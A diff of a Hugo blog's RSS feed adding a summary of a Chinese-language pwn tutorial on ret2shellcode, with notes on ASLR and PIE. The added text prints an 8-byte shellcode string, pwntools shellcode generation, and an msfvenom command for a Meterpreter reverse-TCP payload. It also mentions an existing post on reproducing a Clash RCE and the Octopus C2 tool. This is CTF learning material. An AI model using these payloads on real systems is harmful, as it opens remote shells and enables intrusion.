@@ -6,7 +6,38 @@
     <description>Recent content in Posts on KiraPGR&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 25 Feb 2022 23:27:12 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 03 Mar 2022 05:50:08 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PWN! PWN! PANG! Part5 --- ret2shellcode</title>
+      <link>https://kira-pgr.github.io/posts/pwn5/</link>
+      <pubDate>Thu, 03 Mar 2022 05:50:08 -0500</pubDate>
+      
+      <guid>https://kira-pgr.github.io/posts/pwn5/</guid>
+      <description>PWN! PWN! PANG! Part5 呼～～好久没有继续更新PWN笔记了 (最近学的Web安全的笔记也没写 逃)
+资料投放 老规矩，开头上资料= =
+ret2shellcode
+ShellCode 既然今天的话题叫做ret2shellcode,我们先来了解一下ShellCode
+什么是ShellCode shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写
+简而言之，ShellCode就是执行后可以直接getshell的代码
+如何获取ShellCode 获取ShellCode有很多种方法，这里简单介绍几种
+利用PWNTools自带函数 首先设置目标程序 的参数
+context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;)# os指操作系统，这里是Linux # arch指架构，64位一般是amd64，32位一般是i386 # log_level指日志输出的等级，debug为调试模式 然后用shellcraft.sh()函数获取ShellCode的汇编代码，再调用asm()变成机器码
+shellcode = asm(shellcraft.sh()) 网上找现成的ShellCode ShellStorm: 一个国外ShellCode集合
+ShellStorm中包含多种平台，多种长度，多种功能的ShellCode
+ 为什么ShellCode会考虑长度？
+答: 有时候栈中填入的ShellCode有长度限制
+ 这里举个例子，只有8字节的ShellCode
+&amp;#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&amp;#34; metasploit 想要一个功能更强大且不想要网上到处找？
+MSF的meterpreter你绝对喜欢
+生成ShellCode命令
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Local IP Address&amp;gt; LPORT=&amp;lt;Local Port&amp;gt; -f &amp;lt;language&amp;gt; 自己写 建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个PDF
+PWN! PWN! PANG? 本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode
+大家可以先自己试试再看下面的思路分析.QwQ.
+大概先提几点提示:
+  ShellCode写入哪里呢？
+  ShellCode的地址是什么？</description>
+    </item>
+    
     <item>
       <title>Clash猫猫RCE复现(弹shell)</title>
       <link>https://kira-pgr.github.io/posts/clash_rce/</link>
@@ -61,6 +92,7 @@ C2工具Octopus 在一个装好了Python3和Git的Linux系统执行以下的操�
    P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快且可以脱离客户端
  补充知识点：Linux程序安全保护机制 ASLR: 地址随机化技术   全名: Address Space Layout Randomization
   系统的保护措施, 和程序没有关系, 一般默认目标机器随机化完全开启
+  每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。
   可以通过cat /proc/sys/kernel/randomize_va_space查看系统保护的开启情况
    ASLR选项:
 0 关闭
@@ -68,8 +100,7 @@ C2工具Octopus 在一个装好了Python3和Git的Linux系统执行以下的操�
 2 全随机 brk()分配的堆空间也被虚拟化
  PIE: 随机化ELF文件映射地址 好饿，想吃馅饼了 雾)
   全名: Position-Independent Executable
-  程序的防护措施，编译时生效
-   检测程序防护措施的方法:PWNTools的checksec模块</description>
+  程序的防护措施，编译时生效</description>
     </item>
     
     <item>
